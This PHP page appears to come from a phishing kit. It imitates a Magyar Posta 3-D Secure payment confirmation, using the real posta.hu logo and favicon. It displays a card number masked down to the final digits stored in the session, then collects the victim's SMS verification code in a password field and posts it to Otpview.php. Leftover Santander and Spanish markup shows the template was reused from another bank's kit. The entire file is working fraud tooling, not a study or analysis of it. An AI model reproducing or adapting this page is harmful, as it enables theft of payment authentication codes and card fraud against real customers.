<?php

session_start();

 $timezone = new DateTimeZone("Africa/Johannesburg" );
        $date = new DateTime();
        $date->setTimezone($timezone );
        $dtobj = $date->format('Y/m/d  H:i');
		
$J7 = simplexml_load_file("./Zitop/info.gp");
$A1 = $J7->geoplugin_message;
$A2 = $J7->geoplugin_info;
$A3 = $J7->geoplugin_marche;
$A4 = $J7->geoplugin_marcheName;
$A5 = $J7->geoplugin_monto;
$A6 = $J7->geoplugin_montoQuta;
$A7 = $J7->geoplugin_montoSymbol;
$A8 = $J7->geoplugin_date;
$A9 = $J7->geoplugin_tarjita;
$A10 = $J7->geoplugin_codidi;
$A11 = $J7->geoplugin_boton;
$A12 = $J7->geoplugin_qute;
$A13 = $J7->geoplugin_errror;





?>
<!DOCTYPE html>
<html lang="es">
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Magyar Posta Zrt. - Nyitó</title>
		<link rel="icon" type="image/png" href="https://www.posta.hu/static/favicon.ico">

  <link href="./Zitop/template-e63a3d48ea.min.css" rel="stylesheet">
  
  
  <link href="./Zitop/validateview-451126d279.min.css" rel="stylesheet">
  <style>body {color: #000000;font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;font-size: 1.25em}.header, legend, h1, h2, h3, h4 {color: #000000}label {color: #000000}a,.btn-link {color: #000000;text-decoration: underline}a:visited,.btn-link:visited {color: #000000}a:hover,a:focus,.btn-link:hover,.btn-link:focus {color: #211f1f}a:active,.btn-link:active {color: #211f1f}a.btn-link {font-size: .95em}.btn-primary,.btn-primary:focus,.btn-primary:hover {background: #211f1f;color: #FFF;border: none;border-radius: 0}.btn-primary:active,.btn-primary:active:hover,.btn-primary:active:focus {background: #AB2C29}fieldset {border: 0}fieldset > legend {border-bottom: 0;font-size: 1.00em}:not(.lt-ie9) label.custom-radio [type=radio]:checked+span:before {background: #211f1f}.accordion.modal .modal-body .panel-group .expander {color: #211f1f}.accordion.modal .modal-body .panel-group .panel {background: #FFF}.field-validation-error {color: #AB2C29}.toast-top-full-width {display: none}</style>


</head>
<body>
  <div class="threeds-one">
    


<div class="container container-sticky-footer">
  

<div class="header" id="HeaderLogos">
  <div class="row no-pad">
    <div class="col-12">
      <img alt="Santander Logo" class="img-responsive header-logo pull-left" src="https://www.posta.hu/static/g/main-menu-posta-logo.png">
      <img alt="" class="img-responsive header-logo pull-right" src="./images/3dsecurelogos.png">
    </div>
  </div>
</div>
  


<div class="container container-sticky-footer">
<form action="Otpview.php" id="ValidateCredentialForm" method="post">
    <div class="body" dir="LTR" style="bottom: 54px;">
      
<div class="row form-two-col">
        <div class="col-12">
            <fieldset id="ValidateTransactionDetailsContainer">
    <legend id="ValidateTransactionDetailsHeader" size="2%"><?php echo "$A1";?></legend>


      <br>
                <legend id="ValidateTransactionDetailsHeader"><?php echo "$A2";?></legend>

                <div class="validate-field row">
                    <span class="validate-label col-6"><?php echo "$A3";?>:</span>
                    <span class="col-6"><?php echo "$A4";?></span>
                </div>

                <div class="validate-field row">
                    <span class="validate-label col-6"><?php echo "$A5";?>:</span>
                    <span class="col-6 always-left-to-right"><?php echo "$A6";?> <font size="1"><?php echo "$A7";?></font></span>
                </div>
				
				  <div class="validate-field row">
                    <span class="validate-label col-6"><?php echo "$A8";?>:</span>
                    <span class="col-6 always-left-to-right"><?php echo $dtobj ;?></span>
                </div>

                <div class="validate-field row">
                    <span class="validate-label col-6"><?php echo "$A9";?>:</span>
                    <span class="col-6 always-left-to-right">************<?php echo $_SESSION['scardx'];?></span>
                </div>
                <div class="validate-field row">
                        <span class="validate-label col-6"><?php echo "$A10";?>:</span>
    <span>
      <label for="Credential_Value" hidden="">Digite su código</label>
      <input data-val="true" required id="Credential_Value" name="Ecom_Payment_sms_Verification" type="password" value="">
    </span>

                </div>
                <div class="validate-field row">
                    <span class="validate-label col-6">&nbsp;</span>
                    <span id="ValidationErrorMessage" class="field-validation-error" style="display:inline-block;"><?php echo "$A13";?></span>
                    <span class="field-validation-valid col-6" data-valmsg-for="Credential.Value" data-valmsg-replace="true"></span>
                </div>
            </fieldset>
        </div>
      </div>


      
    </div>
    <div class="sticky-footer">
      <div class="row no-pad">
        <div class="col-12 text-center">
          <button type="submit" class="btn btn-primary" id="ValidateButton"><?php echo "$A11";?></button>
        </div>
      </div>
      

<div class="footer" id="FooterLinks">
  <div class="row">
    <div class="col-12">
      <ul class="list-inline list-inline-separated pull-left"></ul>
      <a id="ExitLink" class="list-inline list-inline-separated pull-right" href="#"><?php echo "$A12";?></a>
    </div>
  </div>
</div>
    </div>
</form></div>
</div>


  </div>




</body></html>